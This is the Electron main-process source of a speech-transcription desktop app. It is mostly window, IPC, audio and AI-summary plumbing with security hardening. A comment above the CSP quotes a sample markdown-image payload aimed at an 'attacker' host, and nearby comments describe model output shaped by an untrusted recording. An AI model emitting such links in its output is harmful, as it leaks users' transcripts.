import {
  app,
  BrowserWindow,
  type BrowserWindowConstructorOptions,
  clipboard,
  Menu,
  Notification,
  dialog,
  ipcMain,
  nativeTheme,
  net,
  powerSaveBlocker,
  protocol,
  screen,
  shell,
} from 'electron';
import { spawn, type ChildProcess } from 'node:child_process';
import fs from 'node:fs';
import path from 'node:path';
import { pathToFileURL } from 'node:url';
import started from 'electron-squirrel-startup';
import type { ExportedAudio, SelectedFile } from './preload';
import { parseCli, renderOutput, USAGE, type CliJob } from './cli';
import { cancelFfmpeg, discardExport, discardStaleExports, exportAudio, extractAudio, ffmpegBinary, isExport } from './audio';
import { pickUiLang, setUiLang, t, UI_LANGS, type UiLang } from './i18n';
import { API_CHUNK_S, MAX_BROWSER_DECODE, SAMPLE_RATE } from './pcm';
import { MAX_PROMPT, type AiTask } from './prompts';
import { AI_TASKS, cancelAi, runApi } from './summary';
import { aiSettings, saveAiSettings } from './aiSettings';
import { parseUpdate, type AiSettings, type ApiCheck } from './api';
import { transcribeApi } from './speech';

// Linux hides WebGPU behind a flag and needs the Vulkan backend explicitly; without both, requestAdapter()
// returns null (or only SwiftShader) and transcription drops to the much slower wasm engine.
// Vulkan also switches window compositing, which paints an empty window on this stack — so composite on the
// CPU instead. Our UI is text and a progress bar; the GPU is here for the model, not for the chrome.
if (process.platform === 'linux') {
  app.commandLine.appendSwitch('enable-unsafe-webgpu');
  app.commandLine.appendSwitch('enable-features', 'Vulkan');
  app.commandLine.appendSwitch('disable-gpu-compositing');
}

// Chromium caps every GPU disk cache at 6 MB. Dawn stores one VkPipelineCache blob per pipeline in
// DawnWebGPUCache and Whisper builds hundreds of them at ~20 KB each, so the cache kept evicting itself and
// every cold start recompiled all shaders: minutes at 0 % with the GPU process on five cores. 512 MB holds the set.
app.commandLine.appendSwitch('gpu-disk-cache-size-kb', String(512 * 1024));
// The weights live in Cache Storage, and Chromium's network cache was quietly keeping a second copy of the same
// download — 426 MB of it, measured next to the 727 MB that is the model itself. Nothing here needs a big HTTP
// cache: the model is fetched once and read from Cache Storage ever after.
app.commandLine.appendSwitch('disk-cache-size', String(64 * 1024 * 1024));

// Chromium refuses CacheStorage on file://, and @huggingface/transformers treats that as "no cache available"
// and re-downloads the model — the packaged app pulled the whole Whisper checkpoint from HuggingFace on every
// launch, while the dev server (http://localhost) cached it fine. A standard+secure scheme gives the renderer a
// real origin, which is what the Cache API keys on. Must be called before `ready`.
const APP_SCHEME = 'app';
const APP_ORIGIN = `${APP_SCHEME}://bundle`;

protocol.registerSchemesAsPrivileged([
  {
    scheme: APP_SCHEME,
    // secure: CacheStorage needs a secure context. supportFetchAPI: the module worker and the onnxruntime .wasm
    // are fetched from this origin. corsEnabled: the worker fetches model files from huggingface.co.
    privileges: { standard: true, secure: true, supportFetchAPI: true, corsEnabled: true },
  },
]);

// Handle creating/removing shortcuts on Windows when installing/uninstalling.
if (started) {
  app.quit();
}

const GPU_LOG_CAP = 64 * 1024; // past this the GPU crash log starts over

const MIN_WIDTH = 640;
const MIN_HEIGHT = 520;
const DEFAULT_BOUNDS = { width: 1040, height: 680 };

type WindowBounds = { width: number; height: number; x?: number; y?: number };

const boundsFile = (): string => path.join(app.getPath('userData'), 'window-state.json');

// A saved position can point at a monitor that is no longer attached — drop it and let Electron center the window.
const isOnSomeDisplay = (x: number, y: number, width: number, height: number): boolean =>
  screen
    .getAllDisplays()
    .some(({ workArea: a }) => x < a.x + a.width && x + width > a.x && y < a.y + a.height && y + height > a.y);

const readBounds = (): WindowBounds => {
  try {
    const saved: unknown = JSON.parse(fs.readFileSync(boundsFile(), 'utf-8'));
    if (typeof saved !== 'object' || saved === null) return DEFAULT_BOUNDS;
    const { width, height, x, y } = saved as Partial<WindowBounds>;
    if (typeof width !== 'number' || typeof height !== 'number') return DEFAULT_BOUNDS;

    const bounds: WindowBounds = { width: Math.max(width, MIN_WIDTH), height: Math.max(height, MIN_HEIGHT) };
    if (typeof x === 'number' && typeof y === 'number' && isOnSomeDisplay(x, y, bounds.width, bounds.height)) {
      bounds.x = x;
      bounds.y = y;
    }
    return bounds;
  } catch {
    return DEFAULT_BOUNDS; // no state yet, or the file is unreadable/corrupted
  }
};

const saveBounds = (window: BrowserWindow): void => {
  try {
    fs.writeFileSync(boundsFile(), JSON.stringify(window.getNormalBounds()));
  } catch {
    // losing the window position is not worth blocking the app from closing
  }
};

let mainWindow: BrowserWindow | null = null;
let working = false;
let closing = false; // a close was asked for and the window is showing its own question
let sleepBlocker: number | null = null;
let inhibitor: ChildProcess | null = null;

/**
 * Keeping the machine awake on Linux, because Chromium's own blocker does not.
 *
 * Measured on KDE/Wayland: `powerSaveBlocker.start()` answers with an id and `isStarted()` says true, while
 * nothing at all is registered — Chromium's Wayland backend hangs the inhibitor off the *focused* surface
 * (`zwp_idle_inhibit_manager`, which logs «Cannot inhibit going idle when no window is focused» and carries
 * on). An hour-long transcription is exactly the work people start and then switch away from, often with the
 * window minimised, so that is the case where the promise has to hold and the one where it did not.
 *
 * logind knows no such condition. `cat` is what keeps the inhibitor alive: it holds our pipe, so when this
 * process dies — cleanly or not — the pipe closes, `cat` ends and the inhibitor goes with it. A crash can
 * therefore not leave a machine that refuses to sleep.
 */
const holdInhibitor = (): void => {
  if (process.platform !== 'linux' || inhibitor !== null) return;

  const child = spawn(
    'systemd-inhibit',
    ['--what=idle:sleep', '--mode=block', '--who=MagScribe', '--why=Transcription in progress', 'cat'],
    { stdio: ['pipe', 'ignore', 'ignore'] },
  );
  // No systemd, no binary, no permission: then the blocker above is all there is, and the run still works.
  const forget = (): void => {
    if (inhibitor === child) inhibitor = null;
  };
  child.on('error', forget);
  child.on('exit', forget);
  inhibitor = child;
};

const releaseInhibitor = (): void => {
  inhibitor?.kill();
  inhibitor = null;
};

/** The renderer tells us when a transcription is in flight; the main process guards the machine around it. */
const setWorking = (value: boolean): void => {
  working = value;

  // A long transcription is unattended work — do not let the machine doze off in the middle of it.
  if (working && sleepBlocker === null) {
    sleepBlocker = powerSaveBlocker.start('prevent-app-suspension');
    holdInhibitor();
  }
  if (!working && sleepBlocker !== null) {
    powerSaveBlocker.stop(sleepBlocker);
    sleepBlocker = null;
    releaseInhibitor();
  }
};

/**
 * A window on our own bundle that cannot leave it. `hash` picks the renderer: `#cli` is the command line's.
 *
 * The preload is attached to every navigation this webContents makes, so a page outside the bundle would get
 * the whole window.api — and with it the claude CLI. The summary is markdown from a model that read an
 * untrusted recording, and react-markdown renders https links as clickable. Nothing here ever needs to leave
 * the bundle, so nothing is allowed to.
 */
const openBundle = (options: BrowserWindowConstructorOptions, hash = ''): BrowserWindow => {
  const window = new BrowserWindow({
    ...options,
    webPreferences: {
      preload: path.join(__dirname, 'preload.js'),
      contextIsolation: true,
      nodeIntegration: false,
      sandbox: true, // the default, spelled out: the preload below relies on it
      ...options.webPreferences,
    },
  });

  window.webContents.setWindowOpenHandler(() => ({ action: 'deny' }));
  window.webContents.on('will-navigate', (event, url) => {
    if (!url.startsWith(`${APP_ORIGIN}/`)) event.preventDefault();
  });

  window.loadURL(`${APP_ORIGIN}/index.html${hash}`);
  return window;
};

const createWindow = () => {
  mainWindow = openBundle({
    ...readBounds(), // no saved x/y -> Electron centers the window itself
    minWidth: MIN_WIDTH,
    minHeight: MIN_HEIGHT,
    show: false, // avoid the white flash: shown on ready-to-show below
    backgroundColor: nativeTheme.shouldUseDarkColors ? '#141414' : '#ffffff',
    // The asar holds only the bundle, so the packaged app reads the icon from resources/ (see forge.config.ts).
    icon: app.isPackaged ? path.join(process.resourcesPath, 'icon.png') : path.join(__dirname, '../../assets/icon.png'),
  });

  const window = mainWindow;

  const show = (): void => {
    if (!window.isDestroyed() && !window.isVisible()) window.show();
  };

  window.once('ready-to-show', show);
  // Safety net: with GPU compositing off (see the Vulkan switches above) a hidden window never paints its
  // first frame, so ready-to-show never fires and the app would sit there invisible.
  window.webContents.once('did-finish-load', show);
  window.on('close', (event) => {
    saveBounds(window);
    if (!working) return;

    event.preventDefault();
    // A second click on the system's close button overrides the question, so a renderer that stopped answering
    // can never trap the person inside the app.
    if (closing) {
      setWorking(false);
      window.destroy();
      return;
    }
    closing = true;
    window.webContents.send('close:ask');
  });
};

/** Writes and then exits: app.exit does not wait for a pipe, and a cut-off .srt is worse than none. */
const exitWith = (code: number, stream: NodeJS.WriteStream, text: string): void => {
  stream.write(text, () => app.exit(code));
};

// Set while a command-line run is in flight; the GPU crash handler below fails it through this.
let cliFail: ((message: string) => void) | null = null;

/**
 * Runs one `--transcribe` job in a hidden window (see headless.ts) and exits: 0 with the result on stdout, or 1
 * with the reason on stderr. The model needs the window's Chromium — WebGPU and the Cache Storage it lives in.
 */
const runCli = (job: CliJob): void => {
  let window: BrowserWindow | null = null;
  let finished = false;

  const finish = (code: number, stream: NodeJS.WriteStream, text: string): void => {
    if (finished) return;
    finished = true;
    cleanup(); // app.exit skips will-quit
    exitWith(code, stream, text);
  };
  const fail = (message: string): void => finish(1, process.stderr, `${message}\n`);
  cliFail = fail;

  // Only the hidden window may talk on these; the channels exist in this mode alone.
  const ours = (event: Electron.IpcMainEvent | Electron.IpcMainInvokeEvent): boolean =>
    window !== null && event.sender === window.webContents;

  ipcMain.handle('cli:job', (event) => {
    if (!ours(event)) throw new Error('cli:job: not the command line window');
    return { file: job.file, language: job.language };
  });
  ipcMain.on('cli:log', (event, line: unknown) => {
    if (ours(event) && !finished) process.stderr.write(`${String(line)}\n`);
  });
  ipcMain.on('cli:fail', (event, message: unknown) => {
    if (ours(event)) fail(String(message));
  });
  ipcMain.on('cli:done', (event, text: unknown, segments: unknown) => {
    if (!ours(event)) return;
    if (typeof text !== 'string' || !Array.isArray(segments)) return fail('cli:done: malformed result');
    finish(0, process.stdout, renderOutput(job.format, text, segments));
  });

  setWorking(true); // the same sleep guard a run in the window gets
  window = openBundle({ show: false, webPreferences: { backgroundThrottling: false } }, '#cli');
  window.webContents.on('render-process-gone', (_event, details) => fail(`renderer gone: ${details.reason}`));
};

const rendererRoot = (): string => path.join(__dirname, `../renderer/${MAIN_WINDOW_VITE_NAME}`);

/** Serves the built renderer over app://. Anything resolving outside the bundle directory is refused. */
// What the window actually needs: the bundle itself, wasm compilation for onnxruntime, its blob workers, the
// weights from Hugging Face (which redirects to cdn-lfs* / transfer.xethub.hf.co), and the bundled font. The
// point of it is the one real hole — a `![](https://attacker/x?d=…)` in what the model writes back would
// otherwise exfiltrate a slice of the transcript. It goes here and not in a meta tag because index.html is
// also served by the dev server, where react-refresh's inline script would force 'unsafe-inline'.
const CSP = [
  "default-src 'none'",
  "script-src 'self' 'wasm-unsafe-eval'",
  "worker-src 'self' blob:",
  "style-src 'self' 'unsafe-inline'",
  "img-src 'self' data:",
  "font-src 'self' data:",
  "connect-src 'self' https://huggingface.co https://*.hf.co https://*.huggingface.co",
  "form-action 'none'",
  "base-uri 'none'",
].join('; ');

const serveBundle = async (request: Request): Promise<Response> => {
  const root = rendererRoot();
  const { pathname } = new URL(request.url);
  const file = path.join(root, decodeURIComponent(pathname));

  // path.join normalises the "..", so this catches both plain and percent-encoded traversal.
  if (file !== root && !file.startsWith(root + path.sep)) return new Response(null, { status: 403 });

  // A missing file rejects instead of answering 404. The offline worker asks for /models/… on purpose (see
  // worker.ts), and a rejection here would land in stderr as a bare `net::ERR_FILE_NOT_FOUND`.
  const response = await net.fetch(pathToFileURL(file).toString()).catch(() => null);
  if (response === null) return new Response(null, { status: 404 });
  const headers = new Headers(response.headers);
  headers.set('Content-Security-Policy', CSP);
  return new Response(response.body, { status: response.status, headers });
};

/**
 * A dev run answers app:// from the Vite dev server instead of the bundle. Chromium keys Cache Storage and
 * localStorage by origin, so on its own localhost origin a dev window saw neither the downloaded model nor the
 * person's settings; on app://bundle it shares both with the installed app. HMR still works: Vite's client
 * cannot reach a socket on app:// and falls back to the dev server's own address.
 */
const serveDev =
  (devServer: string) =>
  (request: Request): Promise<Response> => {
    const { pathname, search } = new URL(request.url);
    return net.fetch(new URL(`${pathname}${search}`, devServer).toString());
  };

// The renderer never touches the filesystem: it gets a path only from this native dialog.
ipcMain.handle('file:select', async (): Promise<SelectedFile | null> => {
  const { canceled, filePaths } = await dialog.showOpenDialog({
    properties: ['openFile'],
    filters: [
      { name: t().filter.video, extensions: ['mp4', 'mkv', 'mov', 'avi', 'webm', 'm4v', 'mpg', 'mpeg', 'wmv'] },
      { name: t().filter.audio, extensions: ['mp3', 'wav', 'm4a', 'flac', 'ogg', 'opus', 'aac', 'wma'] },
      { name: t().filter.all, extensions: ['*'] },
    ],
  });
  if (canceled || filePaths.length === 0) return null;

  const [filePath] = filePaths;
  const { size } = await fs.promises.stat(filePath);
  return { path: filePath, name: path.basename(filePath), size };
});

const requirePath = (value: unknown, channel: string): string => {
  if (typeof value !== 'string' || value.length === 0) throw new Error(`${channel} needs a file path`);
  return value;
};

// Both conversions stream their percentage back to the window that asked for them.
ipcMain.handle('audio:extract', (event, filePath: unknown, from: unknown): Promise<Float32Array> =>
  extractAudio(
    requirePath(filePath, 'audio:extract'),
    (percent) => event.sender.send('audio:progress', percent),
    // Where a resumed run picks up; anything that is not a sane number decodes the file from its start.
    typeof from === 'number' && Number.isFinite(from) && from > 0 ? from : 0,
  ),
);

ipcMain.handle('audio:export', (event, filePath: unknown): Promise<ExportedAudio> =>
  exportAudio(requirePath(filePath, 'audio:export'), (percent) => event.sender.send('audio:progress', percent)),
);

// One piece of the recording to the transcription API. The window cuts it; main checks the cut is one it agreed
// to (a stop goes through ai:cancel, like a summary's).
ipcMain.handle('speech:run', (_event, samples: unknown, language: unknown) => {
  if (!(samples instanceof Float32Array) || samples.length === 0 || samples.length > API_CHUNK_S * SAMPLE_RATE) {
    throw new Error('speech:run needs at most one chunk of samples');
  }
  if (language !== null && (typeof language !== 'string' || !/^[a-z]{2}$/.test(language))) {
    throw new Error('speech:run: malformed language');
  }
  return transcribeApi(samples, language);
});

// Without ffmpeg the window decodes the file itself, with the browser's decoder, and for that it needs the
// bytes. Only as far as that decoder can reasonably go: it holds the whole thing in memory at once.
ipcMain.handle('file:bytes', async (_event, filePath: unknown): Promise<Buffer> => {
  const target = requirePath(filePath, 'file:bytes');
  const { size } = await fs.promises.stat(target);
  if (size > MAX_BROWSER_DECODE) throw new Error('too large to decode without ffmpeg');
  return fs.promises.readFile(target);
});

// Where the last save went. Without it every dialog opens in ~/Downloads, however many times in a row the
// person has picked another folder.
const saveDirFile = (): string => path.join(app.getPath('userData'), 'save-dir.txt');
let saveDir: string | null | undefined; // undefined: not read from disk yet

const readSaveDir = (): string | null => {
  if (saveDir !== undefined) return saveDir;

  try {
    const saved = fs.readFileSync(saveDirFile(), 'utf-8').trim();
    // The folder may have been renamed or removed since; the dialog then falls back to the system's choice.
    saveDir = saved !== '' && path.isAbsolute(saved) && fs.statSync(saved).isDirectory() ? saved : null;
  } catch {
    saveDir = null;
  }
  return saveDir;
};

const rememberSaveDir = (target: string): void => {
  saveDir = path.dirname(target);
  try {
    fs.writeFileSync(saveDirFile(), saveDir, 'utf-8');
  } catch {
    // losing it only costs the next dialog its starting folder
  }
};

/** Save dialog; null when the user cancels. It opens where the last save landed. */
const askWhereToSave = async (
  suggestedName: unknown,
  fallback: string,
  filter: Electron.FileFilter,
): Promise<string | null> => {
  const name = typeof suggestedName === 'string' ? suggestedName : fallback;
  const directory = readSaveDir();

  const { canceled, filePath } = await dialog.showSaveDialog({
    defaultPath: directory === null ? name : path.join(directory, name),
    filters: [filter],
  });
  if (canceled || !filePath) return null;

  rememberSaveDir(filePath);
  return filePath;
};

ipcMain.handle('file:save', async (_event, text: unknown, suggestedName: unknown): Promise<boolean> => {
  if (typeof text !== 'string') throw new Error('file:save needs text');

  // The renderer saves .txt and .srt through this one channel, so the dialog filter follows the name it suggested.
  const suffix = typeof suggestedName === 'string' ? path.extname(suggestedName).slice(1).toLowerCase() : '';
  const extension = /^[a-z0-9]{1,8}$/.test(suffix) ? suffix : 'txt';

  const target = await askWhereToSave(suggestedName, `transcript.${extension}`, {
    name: extension.toUpperCase(),
    extensions: [extension],
  });
  if (target === null) return false;

  await fs.promises.writeFile(target, text, 'utf-8');
  return true;
});

ipcMain.handle('audio:save', async (_event, fromPath: unknown, suggestedName: unknown): Promise<boolean> => {
  // Only the track we just produced may be copied out — the renderer never gets to name arbitrary sources.
  if (typeof fromPath !== 'string' || !isExport(fromPath)) throw new Error('audio:save: unknown source file');

  const target = await askWhereToSave(suggestedName, 'audio.ogg', { name: 'OGG (Opus)', extensions: ['ogg'] });
  if (target === null) return false;

  await fs.promises.copyFile(fromPath, target);
  return true;
});

// The renderer cannot do this itself: its preload is sandboxed, and a sandboxed preload gets only a subset of
// electron (ipcRenderer, contextBridge, webFrame, webUtils, nativeImage, crashReporter) — no clipboard module.
ipcMain.handle('clipboard:write', async (_event, text: unknown): Promise<boolean> => {
  if (typeof text !== 'string') throw new Error('clipboard:write needs text');

  await clipboard.writeText(text); // async since Electron 44, modelled on the W3C API
  // Read it back: on Wayland the selection belongs to whoever claimed it last, so a write can quietly not stick.
  return (await clipboard.readText()) === text;
});

ipcMain.on('theme:set', (_event, theme: unknown) => {
  if (theme !== 'light' && theme !== 'dark' && theme !== 'system') return;
  nativeTheme.themeSource = theme;
  mainWindow?.setBackgroundColor(nativeTheme.shouldUseDarkColors ? '#141414' : '#ffffff');
});

// Stopping a run: the renderer kills its own worker, main kills the conversion it may be sitting in.
ipcMain.on('audio:cancel', cancelFfmpeg);

// The answer to that question. Anything but a clear yes leaves the window alone.
ipcMain.on('close:answer', (_event, quit: unknown) => {
  if (!closing) return; // an answer to a question nobody asked destroys a window mid-run
  closing = false;
  if (quit !== true || mainWindow === null) return;

  setWorking(false);
  saveBounds(mainWindow);
  mainWindow.destroy();
});

ipcMain.on('work:working', (_event, value: unknown) => setWorking(value === true));

// The window's own choice, which may differ from the system locale main started with.
ipcMain.on('lang:set', (_event, lang: unknown) => {
  if (UI_LANGS.includes(lang as UiLang)) setUiLang(lang as UiLang);
});

ipcMain.on('notify', (_event, title: unknown, body: unknown) => {
  if (!Notification.isSupported()) return;

  const notification = new Notification({ title: String(title), body: String(body) });
  notification.on('click', () => mainWindow?.show());
  notification.show();
});

ipcMain.handle('ai:run', (_event, task: unknown, transcript: unknown, prompt: unknown): Promise<string> => {
  // hasOwn, not a truthiness check: AI_TASKS['toString'] would otherwise hand back Object.prototype's method
  // and the window would show its return value as a summary.
  if (typeof task !== 'string' || !Object.hasOwn(AI_TASKS, task)) throw new Error(`ai:run: unknown task ${String(task)}`);
  const run = AI_TASKS[task as AiTask];
  if (typeof transcript !== 'string' || transcript.trim().length === 0) throw new Error('ai:run needs a transcript');

  // The prompt comes from a text box in the settings window: anything odd falls back to the built-in one.
  const edited = typeof prompt === 'string' && prompt.trim().length > 0 ? prompt.trim() : undefined;
  if (edited !== undefined && edited.length > MAX_PROMPT) throw new Error('ai:run: prompt is too long');

  return run(transcript, edited);
});

// A five-minute run the window stopped waiting for; the handler above rejects and the window drops it unread.
ipcMain.on('ai:cancel', cancelAi);

// The engine behind ai:run. The window gets the settings without the key, and a failed save comes back as words
// to show next to the form rather than as a rejection Electron would wrap in its own «Error invoking…» prefix.
ipcMain.handle('ai:settings', (): AiSettings => aiSettings());
ipcMain.handle('ai:settings:set', (_event, update: unknown): { settings: AiSettings } | { error: string } => {
  try {
    return { settings: saveAiSettings(parseUpdate(update)) };
  } catch (error) {
    return { error: error instanceof Error ? error.message : String(error) };
  }
});

// «Перевірити»: one real request to the saved API per engine that uses it, through the same code as the work
// itself — a second of silence to the transcription (which also shows whether the model sends timestamps), a
// one-word chat to the summary. Each failure is the same sentence the work would have shown.
ipcMain.handle('ai:check', async (): Promise<ApiCheck> => {
  const { engine, speech } = aiSettings();
  const attempt = async (task: ApiCheck[number]['task'], request: () => Promise<unknown>) => {
    try {
      await request();
      return { task, error: null };
    } catch (error) {
      return { task, error: error instanceof Error ? error.message : String(error) };
    }
  };
  const results: ApiCheck = [];
  if (speech === 'api') results.push(await attempt('speech', () => transcribeApi(new Float32Array(SAMPLE_RATE), null)));
  if (engine === 'api') results.push(await attempt('summary', () => runApi('Reply with the single word OK.', 'ping')));
  return results;
});

// This method will be called when Electron has finished
// initialization and is ready to create browser windows.
// Some APIs can only be used after this event occurs.
app.on('ready', () => {
  Menu.setApplicationMenu(null);
  // Until the window reports what it is set to, main speaks the system's language.
  setUiLang(pickUiLang(app.getLocale()));
  // The app is dark unless told otherwise, and this is what the first frame is painted with: the renderer
  // re-asserts the saved choice a moment later, but by then the window must not have flashed white.
  nativeTheme.themeSource = 'dark';

  const cli = parseCli(process.argv.slice(1));
  if (cli === 'help') return exitWith(0, process.stdout, USAGE);
  if (typeof cli === 'string') return exitWith(2, process.stderr, `${cli}\n${USAGE}`);

  // One process per profile: the window and the command line share the model cache and the settings. The
  // `cli` flag tells the instance that holds the lock who knocked — see `second-instance` below.
  if (!app.requestSingleInstanceLock({ cli: cli !== null })) {
    if (cli === null) app.quit();
    else exitWith(1, process.stderr, `${t().cli.busy}\n`);
    return;
  }

  protocol.handle(APP_SCHEME, MAIN_WINDOW_VITE_DEV_SERVER_URL ? serveDev(MAIN_WINDOW_VITE_DEV_SERVER_URL) : serveBundle);
  discardStaleExports();
  if (cli === null) return createWindow();

  const file = path.resolve(cli.file);
  try {
    if (!fs.statSync(file).isFile()) throw new Error();
  } catch {
    return exitWith(2, process.stderr, `${t().cli.notAFile(file)}\n`);
  }
  runCli({ ...cli, file });
});

// A second launch: a window comes to the front, and a window started during a command-line run hears why it
// did not open. A command line that knocks on a running window is turned away on its own side and needs nothing.
app.on('second-instance', (_event, _argv, _cwd, data) => {
  if ((data as { cli?: unknown } | null)?.cli === true) return;
  if (cliFail !== null) {
    void dialog.showMessageBox({ type: 'info', message: t().cli.guiBlocked });
    return;
  }
  if (mainWindow?.isMinimized()) mainWindow.restore();
  mainWindow?.focus();
});

// Whether the machine has an ffmpeg at all; the window asks once and offers the download page if it has not.
ipcMain.handle('ffmpeg:present', (): boolean => ffmpegBinary() !== null);

// The one external link the app opens, and it is a constant: nothing from the renderer reaches shell.
ipcMain.on('ffmpeg:download', () => void shell.openExternal('https://ffmpeg.org/download.html'));

const cleanup = (): void => {
  cancelFfmpeg(); // a conversion still running would outlive the window
  cancelAi(); // and so would a claude run
  discardExport();
  releaseInhibitor(); // the pipe would do it anyway; this is the tidy way out
};

app.on('will-quit', cleanup);

// A dead GPU process takes the WebGPU device and the model with it; the renderer would otherwise wait forever at 0 %.
app.on('child-process-gone', (_event, details) => {
  if (details.type !== 'GPU') return;
  const line = `${new Date().toISOString()} GPU process gone: ${details.reason}, exit code ${details.exitCode}`;
  console.error(line);
  const log = path.join(app.getPath('userData'), 'gpu.log');
  try {
    // Start over instead of rotating: the last crashes are the ones worth reading, and userData in this app
    // already has a history of growing on its own.
    if (fs.statSync(log).size > GPU_LOG_CAP) fs.rmSync(log);
  } catch {
    // no log yet, or it cannot be read — either way the append below is still worth trying
  }
  fs.appendFile(log, `${line}\n`, () => {});
  mainWindow?.webContents.send('gpu:gone', t().error.gpuGone(details.reason, details.exitCode));
  cliFail?.(t().error.gpuGone(details.reason, details.exitCode));
});

// Quit when all windows are closed, except on macOS. There, it's common
// for applications and their menu bar to stay active until the user quits
// explicitly with Cmd + Q.
app.on('window-all-closed', () => {
  if (process.platform !== 'darwin') {
    app.quit();
  }
});

app.on('activate', () => {
  // On OS X it's common to re-create a window in the app when the
  // dock icon is clicked and there are no other windows open.
  if (BrowserWindow.getAllWindows().length === 0) {
    createWindow();
  }
});
